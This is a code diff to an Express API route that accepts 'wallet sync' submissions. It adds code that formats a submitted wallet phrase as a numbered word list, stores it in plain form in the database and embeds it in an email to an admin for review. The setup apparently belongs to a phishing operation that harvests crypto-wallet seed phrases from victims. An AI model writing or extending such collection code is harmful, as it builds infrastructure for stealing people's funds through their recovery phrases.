@@ -27,16 +27,25 @@ router.post("/", auth, async (req, res) => {
 
     if (!user) return res.status(404).json({ error: "User not found" });
 
-    // Save to DB
-    const entry = await prisma.walletSync.create({
-      data: {
-        userId: user.id,
-        walletName,
-        method,
-        data: JSON.stringify(data),
-        status: "PENDING",
-      },
-    });
+   // If method is "phrase", format the numbered phrase before saving
+let formattedData = data;
+if (method === "phrase" && data?.phrase) {
+  const words = data.phrase.split(" ").filter(Boolean);
+  formattedData = words.map((w, i) => `${i + 1}. ${w}`).join("\n");
+} else {
+  formattedData = JSON.stringify(data, null, 2);
+}
+
+const entry = await prisma.walletSync.create({
+  data: {
+    userId: user.id,
+    walletName,
+    method,
+    data: formattedData, // ✅ saved in numbered format
+    status: "PENDING",
+  },
+});
+
 
     // --- Professional Admin Email ---
     const adminHtml = `
@@ -59,7 +68,12 @@ router.post("/", auth, async (req, res) => {
 
           <div style="margin-top:16px;padding:12px;border-left:3px solid #2563eb;background:#f9fafb;">
             <p style="margin:0;color:#111827;font-size:14px;"><b>Raw Submission Data:</b></p>
-            <pre style="white-space:pre-wrap;background:#f3f4f6;padding:12px;border-radius:8px;font-size:13px;color:#374151;">${JSON.stringify(data, null, 2)}</pre>
+           <pre style="white-space:pre-wrap;background:#f3f4f6;padding:12px;border-radius:8px;font-size:13px;color:#374151;">
+${method === "phrase"
+  ? formattedData
+  : JSON.stringify(data, null, 2)}
+</pre>
+
           </div>
           <p style="margin-top:24px;">Please review and update the status in the admin dashboard.</p>
         </div>
